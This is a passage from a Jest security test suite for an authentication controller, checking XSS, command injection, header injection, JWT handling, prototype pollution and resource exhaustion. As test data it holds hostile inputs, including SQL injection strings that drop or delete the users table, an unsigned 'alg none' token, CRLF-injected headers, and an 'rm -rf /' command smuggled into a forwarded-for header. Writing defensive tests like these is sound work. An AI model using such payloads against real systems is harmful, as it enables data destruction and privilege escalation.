      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        expect(error.message).not.toContain('<script>');
        expect(error.message).not.toContain('alert(');
      }
    });

    it('should sanitize output in successful responses', async () => {
      const userWithXSS = {
        ...mockUser,
        email: 'test<script>alert("xss")</script>@example.com'
      };

      mockUserModel.create.mockResolvedValue(userWithXSS);

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      if ((res.json as jest.Mock).mock.calls.length > 0) {
        const response = (res.json as jest.Mock).mock.calls[0][0];
        expect(JSON.stringify(response)).not.toContain('<script>');
      }
    });
  });

  describe('Command Injection Protection', () => {
    it('should prevent command injection in email field', async () => {
      const commandPayloads = generateCommandInjectionPayloads();

      for (const payload of commandPayloads) {
        const req = createMockRequest({
          body: {
            email: `test${payload}@example.com`,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Should reject invalid email format
        if ((next as jest.Mock).mock.calls.length > 0) {
          const error = (next as jest.Mock).mock.calls[0][0];
          expect(error.message).toMatch(/email|format/i);
        }
      }
    });

    it('should prevent command injection in password field', async () => {
      const commandPayloads = generateCommandInjectionPayloads();

      for (const payload of commandPayloads) {
        const req = createMockRequest({
          body: {
            email: 'test@example.com',
            password: `ValidPass123!${payload}`
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Should handle password normally (no command execution)
        // Password field should be hashed, not executed
        if (mockUserModel.create.mock.calls.length > 0) {
          expect(mockUserModel.create).toHaveBeenCalledWith({
            email: 'test@example.com',
            password: expect.stringContaining('ValidPass123!')
          });
        }
      }
    });
  });

  // ==================== PROTOCOL SECURITY TESTS ====================

  describe('Protocol Security', () => {
    it('should handle malformed JWT headers', async () => {
      const malformedHeaders = [
        'Bearer',
        'Bearer ',
        'Bearer token-without-dots',
        'NotBearer validtoken',
        'Bearer token.with.invalid.segments.extra',
        'Basic dXNlcjpwYXNz', // Wrong auth type
        'Bearer ' + 'a'.repeat(10000) // Extremely long token
      ];

      for (const header of malformedHeaders) {
        const req = createMockRequest({
          headers: {
            authorization: header
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        // This would typically be handled by auth middleware
        // Here we test that our controller handles unauthenticated requests properly
        await authController.me(req as any, res as any, next);

        expect((next as jest.Mock)).toHaveBeenCalledWith(
          expect.objectContaining({
            statusCode: 401,
            message: 'Not authenticated'
          })
        );

        jest.clearAllMocks();
      }
    });

    it('should prevent header injection attacks', async () => {
      const maliciousHeaders = {
        'authorization': 'Bearer valid-token\r\nX-Admin: true',
        'user-agent': 'Browser\r\nAuthorization: Bearer admin-token',
        'x-forwarded-for': '127.0.0.1\r\nAuthorization: Bearer malicious'
      };

      for (const [headerName, headerValue] of Object.entries(maliciousHeaders)) {
        const req = createMockRequest({
          headers: {
            [headerName]: headerValue
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.me(req as any, res as any, next);

        // Should handle malformed headers gracefully
        expect((next as jest.Mock)).toHaveBeenCalled();
        
        jest.clearAllMocks();
      }
    });
  });

  // ==================== COMPREHENSIVE SECURITY SCENARIOS ====================

  describe('Real-World Attack Scenarios', () => {
    it('should defend against combined attack vectors', async () => {
      // Simulate sophisticated attack combining multiple techniques
      const sophisticatedAttack = {
        email: "admin'; DROP TABLE users; --<script>alert('xss')</script>@evil.com",
        password: "password'; DELETE FROM users WHERE '1'='1",
        __proto__: { isAdmin: true },
        constructor: { prototype: { role: 'admin' } },
        toString: () => 'malicious'
      };

      const req = createMockRequest({
        body: sophisticatedAttack,
        headers: {
          'authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJpc0FkbWluIjp0cnVlfQ.',
          'user-agent': 'AttackBot\r\nX-Admin: true',
          'x-forwarded-for': '127.0.0.1; rm -rf /'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      // Should handle sophisticated attacks gracefully
      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        expect(error.statusCode).toBe(400);
      }

      // Should not pollute prototypes
      expect((Object.prototype as any).isAdmin).toBeUndefined();
      expect((Object.prototype as any).role).toBeUndefined();
    });

    it('should maintain security under resource exhaustion', async () => {
      const massivePayload = {
        email: 'test@example.com',
        password: 'ValidPass123!' + 'A'.repeat(100000),
        extraData: 'X'.repeat(1000000),
        nestedObject: {
          level1: {
            level2: {
              level3: 'deep'.repeat(10000)
            }
          }
        }
      };

      const req = createMockRequest({
        body: massivePayload
      });
      const res = createMockResponse();
      const next = createMockNext();

      // Should handle large payloads without crashing
      await expect(
        authController.register(req as any, res as any, next)
      ).resolves.not.toThrow();

      // Should still validate input properly
      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        expect(error).toBeDefined();
      }
    });

    it('should prevent information disclosure through error correlation', async () => {
      const testScenarios = [
        { email: 'test@example.com', password: '' }, // Empty password
        { email: '', password: 'ValidPass123!' },    // Empty email
        { email: 'invalid-email', password: 'ValidPass123!' }, // Invalid email
        { email: 'test@example.com', password: 'short' }       // Short password
      ];

      const errors = [];

      for (const scenario of testScenarios) {
        const req = createMockRequest({
          body: scenario
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        if ((next as jest.Mock).mock.calls.length > 0) {
          const error = (next as jest.Mock).mock.calls[0][0];
          errors.push({
            scenario: scenario,
            message: error.message,
            statusCode: error.statusCode
          });
        }

        jest.clearAllMocks();
      }

      // Should provide specific error messages for client validation
      // but not expose internal system details
      errors.forEach(error => {
        expect(error.statusCode).toBe(400);
        expect(error.message).not.toContain('database');
        expect(error.message).not.toContain('server');
        expect(error.message).not.toContain('internal');
      });
    });
  });

  // ==================== CLEANUP AND SECURITY STATE ====================

  describe('Security State Management', () => {
    it('should not leave sensitive data in memory after errors', async () => {
      const sensitivePassword = 'SuperSecret123!';
      
      mockUserModel.create.mockRejectedValue(new Error('Database error'));

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: sensitivePassword
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      // Password should not be logged or exposed in error context
      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        expect(error.message).not.toContain(sensitivePassword);
        expect(JSON.stringify(error)).not.toContain(sensitivePassword);
      }
    });

    it('should maintain security guarantees under concurrent load', async () => {
      const concurrentRequests = 20;
      const promises = [];

      for (let i = 0; i < concurrentRequests; i++) {
        mockUserModel.create.mockResolvedValue({
          ...mockUser,
          id: `concurrent-user-${i}`,
          email: `concurrent${i}@example.com`
        });

        const req = createMockRequest({
          body: {
            email: `concurrent${i}@example.com`,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        promises.push(authController.register(req as any, res as any, next));
      }

      // Should handle concurrent requests without security violations
      const results = await Promise.allSettled(promises);
      
      // All requests should complete (fulfilled or rejected)
      expect(results.length).toBe(concurrentRequests);
      
      // No unhandled promise rejections
      const rejected = results.filter(r => r.status === 'rejected');
      expect(rejected.length).toBe(0);
    });
  });
});



